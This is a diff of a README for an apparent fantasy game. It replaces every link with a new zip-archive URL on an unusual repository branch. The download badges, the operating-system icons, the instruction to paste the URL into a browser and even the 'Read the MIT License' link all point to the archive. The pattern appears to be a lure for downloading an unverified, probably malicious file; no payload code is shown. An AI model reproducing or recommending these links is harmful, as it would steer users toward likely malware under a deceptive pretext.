@@ -1,6 +1,6 @@
 # Knightly Passions In the Grip of Ice – Download Edition ❄️
 
-[![Download](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)
 
 Welcome to the shimmering northern wilds, where chivalry faces the edge of ice and legend comes alive! **Knightly Passions In the Grip of Ice** is your grand portal into a captivating game adventure that bridges classic storytelling, modern technology, and ingenious interactivity. Step forward, noble gamer, for your next expedition begins here.
 
@@ -12,11 +12,11 @@ Satisfy your curiosity with our robust compatibility chart and see if your devic
 
 | Operating System  | Supported Since | Download Available |
 |-------------------|:--------------:|:-----------------:|
-| ![Windows](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip) | 10/11         | ✅ |
-| ![MacOS](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)   | 10.15+        | ✅ |
-| ![Linux](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip) | Ubuntu 18+    | ✅ |
-| ![Android](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip) | 10+        | ⏳ Soon |
-| ![iOS](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)       | 13+           | ⏳ Soon |
+| ![Windows](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip) | 10/11         | ✅ |
+| ![MacOS](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)   | 10.15+        | ✅ |
+| ![Linux](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip) | Ubuntu 18+    | ✅ |
+| ![Android](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip) | 10+        | ⏳ Soon |
+| ![iOS](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)       | 13+           | ⏳ Soon |
 
 ---
 
@@ -47,7 +47,7 @@ Satisfy your curiosity with our robust compatibility chart and see if your devic
 Before descending the spiral staircases of icy lore, prepare wisely:
 
 **Step 1:** Click the Download emblem above or at the end of this document.  
-*(Note: The link is for display; input https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip in your browser as provided.)*
+*(Note: The link is for display; input https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip in your browser as provided.)*
 
 **Step 2:**  
    - Windows/Mac/Linux: Unpack the downloaded file using a trusted archive tool.
@@ -105,11 +105,11 @@ Harnessing the wisdom of the present and magic of the future, In the Grip of Ice
 ## 📜 MIT License (c) 2025
 
 This repository rides under the vigilant shield of the MIT License.  
-[Read the MIT License](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip) to understand what freedoms and responsibilities await.
+[Read the MIT License](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip) to understand what freedoms and responsibilities await.
 
 ---
 
-[![Download](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)](https://github.com/DonDeLaVega80/knightly-passions-icebound-adventure/raw/refs/heads/branch/meyerhofferite/adventure_knightly_icebound_passions_1.9-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)](https://raw.githubusercontent.com/DonDeLaVega80/knightly-passions-icebound-adventure/branch/meyerhofferite/passions-knightly-adventure-icebound-v2.8.zip)
 
 ---
 **Your heroic voyage begins with a single click. Ready your sword—brave the cold!**
